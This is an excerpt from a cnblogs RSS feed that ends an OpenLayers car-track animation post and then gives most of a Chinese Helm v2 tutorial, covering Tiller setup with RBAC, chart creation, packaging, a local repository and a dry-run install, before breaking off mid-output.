                        cosA &lt;/span&gt;* curStep * step + bPoint[0&lt;span&gt;]
                        ,
                        sinA &lt;/span&gt;* curStep * step + bPoint[1&lt;span&gt;]
                    ]);
                }
                destCroods.push(nextPoint);
            }&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curStep * step &amp;lt;&lt;span&gt; bevelling);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; destCroods;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中用到了一些数学上的三角函数和计算方法。此方法最终选一个根据步长计算后的坐标集合。&lt;/p&gt;

&lt;h3&gt;3.3 利用postcompose实现运动效果&lt;/h3&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;tracerun(){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;this&lt;/span&gt;.traceLine) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.traceCroods = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.cutTrace();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.now = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date().getTime();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.on('postcompose', &lt;span&gt;this&lt;/span&gt;.moveFeature.bind(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.map.render();
    }
    moveFeature(event){
        let vCxt &lt;/span&gt;=&lt;span&gt; event.vectorContext;
        let fState &lt;/span&gt;=&lt;span&gt; event.frameState;
        let elapsedTime &lt;/span&gt;= fState.time - &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.now;
        let index &lt;/span&gt;= Math.round(300 * elapsedTime / 1000&lt;span&gt;);
        let len &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods.length;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(index &amp;gt;=&lt;span&gt; len){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;stop&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.map.un('postcompose', &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.moveFeature);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
        let dx, dy, rotation;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.traceCroods[index] &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;.traceCroods[index + 1&lt;span&gt;]){
            let isRigth &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            let bCrood &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods[index].getCoordinates();
            let eCrood &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;.traceCroods[index + 1&lt;span&gt;].getCoordinates();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(bCrood[0] &amp;lt; eCrood[0&lt;span&gt;]){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;左-&amp;gt;右&lt;/span&gt;
                isRigth = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
            }
            dx &lt;/span&gt;= bCrood[0] - eCrood[0&lt;span&gt;];
            dy &lt;/span&gt;= bCrood[1] - eCrood[1&lt;span&gt;];

            rotation &lt;/span&gt;=&lt;span&gt; Math.atan2(dy,dx);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(rotation &amp;gt; (Math.PI / 2&lt;span&gt;)){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;修正&lt;/span&gt;
                rotation =  Math.PI -&lt;span&gt; rotation;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(rotation &amp;lt; -1 * (Math.PI / 2&lt;span&gt;)){
                rotation &lt;/span&gt;= -1 * Math.PI -&lt;span&gt; rotation;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                rotation &lt;/span&gt;= -&lt;span&gt;rotation;
            }
            console.log(dx &lt;/span&gt;+ '  ' + dy + '  ' +&lt;span&gt; rotation);
            let curPoint &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods[index];
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; anchor = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Feature(curPoint);
            let style &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Style({
                image: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Icon({
                    img: isRigth &lt;/span&gt;? &lt;span&gt;this&lt;/span&gt;.carRight : &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.carImg,
                    imgSize: [&lt;/span&gt;32,32&lt;span&gt;],
                    rotateWithView: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
                    rotation: rotation
                }),
                text: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Text({
                    text: &lt;/span&gt;'Car'&lt;span&gt;,
                    fill: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fill({
                        color: &lt;/span&gt;'red'&lt;span&gt;
                    }),
                    offsetY: &lt;/span&gt;-20&lt;span&gt;
                })
            });  
            vCxt.drawFeature(anchor, style);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;this.map.getView().setCenter(bCrood);&lt;/span&gt;
&lt;span&gt;        }
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.map.render();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    此移动代码的是用ol的postcompose事件进行实现的，因为render方法执行完成后会触发postcompose事件，所以就代替了定时器的的实现方案。其中rotation根据两点坐标计算出移动图标的斜度、以及移动的方向等，更为影响的展示。&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 13:36:00 +0000</pubDate>
<dc:creator>小龙女先生</dc:creator>
<og:description>近期由于业务的需求，让我这从未想过要碰Web Gis的业余前端开发者，走了Web Gis的开发道路。功能需求很简单，但却也是让自己难为了好几天。如，应该选择那个Gis框架，Gis框架的兼容性如何，直接</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/cqhaibin/p/10786886.html</dc:identifier>
</item>
<item>
<title>Helm学习笔记 - 渣渣辉</title>
<link>http://www.cnblogs.com/Dev0ps/p/10658491.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Dev0ps/p/10658491.html</guid>
<description>&lt;p&gt;                                                                                　　　　　　　　　　　　　　Helm学习笔记&lt;/p&gt;
&lt;p&gt;Helm 是 Kubernetes 生态系统中的一个软件包管理工具。本文将介绍 Helm 中的相关概念和基本工作原理，并通过一个具体的示例学习如何使用 Helm 打包、分发、安装、升级及回退 Kubernetes 应用。&lt;/p&gt;
&lt;h3 id=&quot;kubernetes-应用部署的挑战&quot;&gt;Kubernetes 应用部署的挑战&lt;/h3&gt;
&lt;p&gt;Kubernetes 是一个提供了基于容器的应用集群管理解决方案，Kubernetes 为容器化应用提供了部署运行、资源调度、服务发现和动态伸缩等一系列完整功能。&lt;/p&gt;
&lt;p&gt;Kubernetes 的核心设计理念是: 用户定义要部署的应用程序的规则，而 Kubernetes 则负责按照定义的规则部署并运行应用程序。如果应用程序出现问题导致偏离了定义的规格，Kubernetes 负责对其进行自动修正。例如：定义的应用规则要求部署两个实例（Pod），其中一个实例异常终止了，Kubernetes 会检查到并重新启动一个新的实例。&lt;/p&gt;
&lt;p&gt;用户通过使用 Kubernetes API 对象来描述应用程序规则，包括 Pod、Service、Volume、Namespace、ReplicaSet、Deployment、Job等等。一般这些资源对象的定义需要写入一系列的 YAML 文件中，然后通过 Kubernetes 命令行工具 Kubectl 调 Kubernetes API 进行部署。&lt;/p&gt;
&lt;p&gt;以一个典型的三层应用 Wordpress 为例，该应用程序就涉及到多个 Kubernetes API 对象，而要描述这些 Kubernetes API 对象就可能要同时维护多个 YAML 文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.hi-linux.com/img/linux/helm01.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从上图可以看到，在进行 Kubernetes 软件部署时，我们面临下述几个问题：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如何管理、编辑和更新这些这些分散的 Kubernetes 应用配置文件。&lt;/li&gt;
&lt;li&gt;如何把一套相关的配置文件作为一个应用进行管理。&lt;/li&gt;
&lt;li&gt;如何分发和重用 Kubernetes 的应用配置。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Helm 的出现就是为了很好地解决上面这些问题。&lt;/p&gt;
&lt;h3&gt;一、Helm 是什么？&lt;/h3&gt;
&lt;p&gt;Helm 是 Deis 开发的一个用于 Kubernetes 应用的包管理工具，主要用来管理 Charts。有点类似于 Ubuntu 中的 APT 或 CentOS 中的 YUM。&lt;br/&gt;Helm Chart 是用来封装 Kubernetes 原生应用程序的一系列 YAML 文件。可以在你部署应用的时候自定义应用程序的一些 Metadata，以便于应用程序的分发。&lt;br/&gt;对于应用发布者而言，可以通过 Helm 打包应用、管理应用依赖关系、管理应用版本并发布应用到软件仓库。&lt;br/&gt;对于使用者而言，使用 Helm 后不用需要编写复杂的应用部署文件，可以以简单的方式在 Kubernetes 上查找、安装、升级、回滚、卸载应用程序。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;基础概念&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;br/&gt;    Helm：客户端，主要负责管理本地的 Charts、repositories 以及与tiller服务器交互，发送Chart，实例安装、查询、卸载等操作；&lt;br/&gt;    Tiller：安装在 k8s 集群中的服务端，是实际用来管理安装在 k8s 中应用的，就是将模板与 values 合并，当然实际开发过程中， 也可以安装在 k8s 集群之外 ；接收helm发来的Charts与Config，合并生产relase;&lt;br/&gt;    Chart：是用来管理模板与默认 values 的项目，也可以认为是一个 package，可以发布到专门的 repository；&lt;br/&gt;    Repository: Chart仓库，https/http服务器；&lt;br/&gt;    Release：特定的Chart部署于目标集群上的一个实例；&lt;br/&gt;    Release：使用 helm install 命令在 Kubernetes 集群中部署的 Chart 称为 Release。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Helm 工作原理&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;br/&gt;这张图描述了 Helm 的几个关键组件 Helm（客户端）、Tiller（服务器）、Repository（Chart 软件仓库）、Chart（软件包）之间的关系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201904/1271786-20190405125258416-383946655.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;Chart Install 过程&lt;/p&gt;&lt;p&gt;    Helm 从指定的目录或者 TAR 文件中解析出 Chart 结构信息。&lt;br/&gt;    Helm 将指定的 Chart 结构和 Values 信息通过 gRPC 传递给 Tiller。&lt;br/&gt;    Tiller 根据 Chart 和 Values 生成一个 Release。&lt;br/&gt;    Tiller 将 Release 发送给 Kubernetes 用于生成 Release。&lt;/p&gt;&lt;p&gt;Chart Update 过程&lt;/p&gt;&lt;p&gt;    Helm 从指定的目录或者 TAR 文件中解析出 Chart 结构信息。&lt;br/&gt;    Helm 将需要更新的 Release 的名称、Chart 结构和 Values 信息传递给 Tiller。&lt;br/&gt;    Tiller 生成 Release 并更新指定名称的 Release 的 History。&lt;br/&gt;    Tiller 将 Release 发送给 Kubernetes 用于更新 Release。&lt;/p&gt;&lt;p&gt;Chart Rollback 过程&lt;/p&gt;&lt;p&gt;    Helm 将要回滚的 Release 的名称传递给 Tiller。&lt;br/&gt;    Tiller 根据 Release 的名称查找 History。&lt;br/&gt;    Tiller 从 History 中获取上一个 Release。&lt;br/&gt;    Tiller 将上一个 Release 发送给 Kubernetes 用于替换当前 Release。&lt;/p&gt;&lt;p&gt;Chart 处理依赖说明&lt;/p&gt;&lt;p&gt;Tiller 在处理 Chart 时，直接将 Chart 以及其依赖的所有 Charts 合并为一个 Release，同时传递给 Kubernetes。因此 Tiller 并不负责管理依赖之间的启动顺序。Chart 中的应用需要能够自行处理依赖关系。&lt;/p&gt;
&lt;h3&gt;二、Helm部署&lt;/h3&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
安装 Helm 客户端
# 下载 Helm
$ wget https://storage.googleapis.com/kubernetes-helm/helm-v2.13.1-linux-amd64.tar.gz
# 解压 Helm
$ tar -xf helm-v2.13.1-linux-amd64.tar.gz
# 复制客户端执行文件到 bin 目录下就可以用了
$ cp linux-amd64/helm /usr/local/bin/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;安装 Helm 服务器端 Tiller&lt;br/&gt;官方地址：&lt;a href=&quot;https://github.com/helm/helm/blob/master/docs/rbac.md&quot; target=&quot;_blank&quot;&gt;https://github.com/helm/helm/blob/master/docs/rbac.md&lt;/a&gt;&lt;br/&gt;给 Tiller 授权&lt;br/&gt;因为 Helm 的服务端 Tiller 是一个部署在 Kubernetes 中 Kube-System Namespace 下 的 Deployment，它会去连接 Kube-Api 在 Kubernetes 里创建和删除应用。&lt;br/&gt;而从 Kubernetes 1.6 版本开始，API Server 启用了 RBAC 授权。目前的 Tiller 部署时默认没有定义授权的 ServiceAccount，这会导致访问 API Server 时被拒绝。所以我们需要明确为 Tiller 部署添加授权。&lt;br/&gt;创建 Kubernetes 的服务帐号和绑定角色&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master helm]# cat tiller-rbac.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: tiller
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: tiller
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: tiller
    namespace: kube-system
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;$ kubectl create -f rbac-config.yaml&lt;/p&gt;&lt;p&gt;Tiller 是以 Deployment 方式部署在 Kubernetes 集群中的，只需使用以下指令便可简单的完成安装。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm init --service-account tiller --history-max 200
$ kubectl get deployment --all-namespaces
NAMESPACE     NAME                   DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE
kube-system   tiller-deploy          1         1         1            1           1h
$ kubectl create serviceaccount --namespace kube-system tiller
$ kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看是否授权成功&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ kubectl get deploy --namespace kube-system   tiller-deploy  --output yaml|grep  serviceAccount
serviceAccount: tiller
serviceAccountName: tiller
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;验证 Tiller 是否安装成功&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ kubectl -n kube-system get pods|grep tiller
tiller-deploy-76cc4d8dd7-9npql   1/1       Running   0          13m
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下报错：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;39&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master helm]# helm version
Client: &amp;amp;version.Version{SemVer:&quot;v2.13.1&quot;, GitCommit:&quot;618447cbf203d147601b4b9bd7f8c37a5d39fbb4&quot;, GitTreeState:&quot;clean&quot;}
E0324 20:31:08.975504   25692 portforward.go:391] an error occurred forwarding 21997 -&amp;gt; 44134: error forwarding port 44134 to pod 22949bd678ee460bf0ca7d42a39e9d0b2f7a3e43793fc73f584240c3072bdb71, uid : unable
to do port forwarding: socat not found.E0324 20:31:09.979645   25692 portforward.go:391] an error occurred forwarding 21997 -&amp;gt; 44134: error forwarding port 44134 to pod 22949bd678ee460bf0ca7d42a39e9d0b2f7a3e43793fc73f584240c3072bdb71, uid : unable
to do port forwarding: socat not found.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;解决办法：在k8s的node节点安装ssocat即可解决&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$sudo yum install socat
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;br/&gt;卸载 Helm 服务器端 Tiller&lt;/p&gt;&lt;p&gt;如果你需要在 Kubernetes 中卸载已部署的 Tiller，可使用以下命令完成卸载。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm reset
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;更新镜像&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm  repo update
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Helm常用命令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
    release管理：
        install
        delete
        upgrade/rollback
        list
        history
        status：获取release状态信息

    chart管理：
        create
        fetch
        get
        inspect
        package
        verify
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;三、构建一个 Helm Chart&lt;/h3&gt;
&lt;p&gt;Kubernetes官方镜像地址：&lt;a href=&quot;https://hub.kubeapps.com/&quot; target=&quot;_blank&quot;&gt;https://hub.kubeapps.com/&lt;/a&gt;&lt;br/&gt;下面我们通过一个完整的示例来学习如何使用 Helm 创建、打包、分发、安装、升级及回退Kubernetes应用。&lt;br/&gt;创建一个名为 myapp 的 Chart&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm create myapp
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;该命令创建了一个 myapp 目录，该目录结构如下所示。这里我们主要关注目录中的 Chart.yaml、values.yaml、NOTES.txt 和 Templates 目录。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ tree myapp/
myapp/
├── charts
├── Chart.yaml
├── templates
│   ├── deployment.yaml
│   ├── _helpers.tpl
│   ├── ingress.yaml
│   ├── NOTES.txt
│   └── service.yaml
└── values.yaml

2 directories, 7 files
&lt;/pre&gt;&lt;/div&gt;
&lt;ol&gt;&lt;li&gt;    Chart.yaml 用于描述这个 Chart的相关信息，包括名字、描述信息以及版本等。&lt;/li&gt;
&lt;li&gt;    values.yaml 用于存储 templates 目录中模板文件中用到变量的值。&lt;/li&gt;
&lt;li&gt;    NOTES.txt 用于介绍 Chart 部署后的一些信息，例如：如何使用这个 Chart、列出缺省的设置等。&lt;/li&gt;
&lt;li&gt;    Templates 目录下是 YAML 文件的模板，该模板文件遵循 Go template 语法。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Templates 目录下 YAML 文件模板的值默认都是在 values.yaml 里定义的，比如在 deployment.yaml 中定义的容器镜像。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
image: &quot;{{ .Values.image.repository }}:{{ .Values.image.tag }}&quot;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中的 .Values.image.repository 的值就是在 values.yaml 里定义的 nginx，.Values.image.tag 的值就是 stable。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ cat myapp/values.yaml|grep repository
repository: nginx

$ cat myapp/values.yaml|grep tag
tag: stable
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以上两个变量值是在 create chart 的时候就自动生成的默认值，你可以根据实际情况进行修改。&lt;/p&gt;&lt;p&gt; 如果你需要了解更多关于 Go 模板的相关信息，可以查看 Hugo 的一个关于 Go 模板 的介绍。&lt;/p&gt;&lt;p&gt;编写应用的介绍信息&lt;/p&gt;&lt;p&gt;打开 Chart.yaml, 填写你部署的应用的详细信息，以 myapp 为例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ cat myapp/Chart.yaml
apiVersion: v1
appVersion: &quot;1.0&quot;
description: A Helm chart for Kubernetes
name: myapp
version: 0.1.0
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编写应用具体部署信息&lt;/p&gt;&lt;p&gt;编辑 values.yaml，它默认会在 Kubernetes 部署一个 Nginx。下面是 myapp 应用的 values.yaml 文件的内容：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;39&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ cat myapp/values.yaml
# Default values for myapp.
# This is a YAML-formatted file.
# Declare variables to be passed into your templates.

replicaCount: 1

image:
  repository: nginx
  tag: stable
  pullPolicy: IfNotPresent

service:
  type: ClusterIP
  port: 80

ingress:
  enabled: false
  annotations: {}
    # kubernetes.io/ingress.class: nginx
    # kubernetes.io/tls-acme: &quot;true&quot;
  path: /
  hosts:
    - chart-example.local
  tls: []
  #  - secretName: chart-example-tls
  #    hosts:
  #      - chart-example.local

resources: {}
  # We usually recommend not to specify default resources and to leave this as a conscious
  # choice for the user. This also increases chances charts run on environments with little
  # resources, such as Minikube. If you do want to specify resources, uncomment the following
  # lines, adjust them as necessary, and remove the curly braces after 'resources:'.
  # limits:
  #  cpu: 100m
  #  memory: 128Mi
  # requests:
  #  cpu: 100m
  #  memory: 128Mi

nodeSelector: {}

tolerations: []

affinity: {}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;检查依赖和模板配置是否正确&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm lint myapp/
==&amp;gt; Linting .
[INFO] Chart.yaml: icon is recommended

1 chart(s) linted, no failures
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果文件格式错误，可以根据提示进行修改。&lt;br/&gt;将应用打包&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm package myapp
Successfully packaged chart and saved it to: /root/k8s_yaml/helm/myapp-0.1.0.tgz
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;myapp 目录会被打包为一个 myapp-0.1.0.tgz 格式的压缩包，该压缩包会被放到当前目录下，并同时被保存到了 Helm 的本地缺省仓库目录中。&lt;/p&gt;&lt;p&gt;如果你想看到更详细的输出，可以加上 --debug 参数来查看打包的输出，输出内容应该类似如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm package myapp --debug
Successfully packaged chart and saved it to: /root/k8s_yaml/helm/myapp-0.1.0.tgz
[debug] Successfully saved /root/k8s_yaml/helm/myapp-0.1.0.tgz to /root/.helm/repository/local
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;将应用发布到 Repository&lt;/p&gt;&lt;p&gt;虽然我们已经打包了 Chart 并发布到了 Helm 的本地目录中，但通过 helm search 命令查找，并不能找不到刚才生成的 myapp包。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm search myapp
No results found
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这是因为 Repository 目录中的 Chart 包还没有被 Helm 管理。通过 helm repo list 命令可以看到目前 Helm 中已配置的 Repository 的信息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm repo list
NAME    URL
stable  https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    注：新版本中执行 helm init 命令后默认会配置一个名为 local 的本地仓库。&lt;/p&gt;&lt;p&gt;我们可以在本地启动一个 Repository Server，并将其加入到 Helm Repo 列表中。Helm Repository 必须以 Web 服务的方式提供，这里我们就使用 helm serve 命令启动一个 Repository Server，该 Server 缺省使用 $HOME/.helm/repository/local 目录作为 Chart 存储，并在 8879 端口上提供服务。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm serve &amp;amp;
Now serving you on 127.0.0.1:8879
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认情况下该服务只监听 127.0.0.1，如果你要绑定到其它网络接口，可使用以下命令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm serve --address 192.168.100.211:8879 &amp;amp;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果你想使用指定目录来做为 Helm Repository 的存储目录，可以加上 --repo-path 参数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm serve --address 192.168.100.211:8879 --repo-path /data/helm/repository/ --url http://192.168.100.211:8879/charts/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;通过 helm repo index 命令将 Chart 的 Metadata 记录更新在 index.yaml 文件中:&lt;/p&gt;&lt;p&gt;# 更新 Helm Repository 的索引文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ cd /home/k8s/.helm/repository/local
$ helm repo index --url=http://192.168.100.211:8879 .
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完成启动本地 Helm Repository Server 后，就可以将本地 Repository 加入 Helm 的 Repo 列表。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm repo add local http://127.0.0.1:8879
&quot;local&quot; has been added to your repositories
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;现在再次查找 myapp 包，就可以搜索到了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
$ helm repo update
$ helm search myapp
NAME             CHART VERSION    APP VERSION    DESCRIPTION
local/myapp    0.1.0            1.0            A Helm chart for Kubernetes
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;四、在 Kubernetes 中部署应用&lt;/h3&gt;
&lt;p&gt;部署一个应用&lt;br/&gt;Chart 被发布到仓储后，就可以通过 helm install 命令部署该 Chart。&lt;/p&gt;&lt;p&gt;  检查配置和模板是否有效&lt;/p&gt;&lt;p&gt;当使用 helm install 命令部署应用时，实际上就是将 templates 目录下的模板文件渲染成 Kubernetes 能够识别的 YAML 格式。&lt;/p&gt;&lt;p&gt;在部署前我们可以使用 helm install --dry-run --debug &amp;lt;chart_dir&amp;gt; --name &amp;lt;release_name&amp;gt;命令来验证 Chart 的配置。该输出中包含了模板的变量配置与最终渲染的 YAML 文件。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@master ~]# helm install --dry-run --debug local/myapp --name myapp-test
[debug] Created tunnel using local port: '21619'

[debug] SERVER: &quot;127.0.0.1:21619&quot;

[debug] Original chart version: &quot;&quot;
[debug] Fetched local/myapp to /root/.helm/cache/archive/myapp-0.1.0.tgz

[debug] CHART PATH: /root/.helm/cache/archive/myapp-0.1.0.tgz

NAME:   myapp-test
REVISION: 1
RELEASED: Fri Apr  5 11:17:02 2019
CHART: myapp-0.1.0
USER-SUPPLIED VALUES:
{}

COMPUTED VALUES:
affinity: {}
fullnameOverride: &quot;&quot;
image:
  pullPolicy: IfNotPresent
  repository: nginx
  tag: stable
ingress:
  annotations: {}
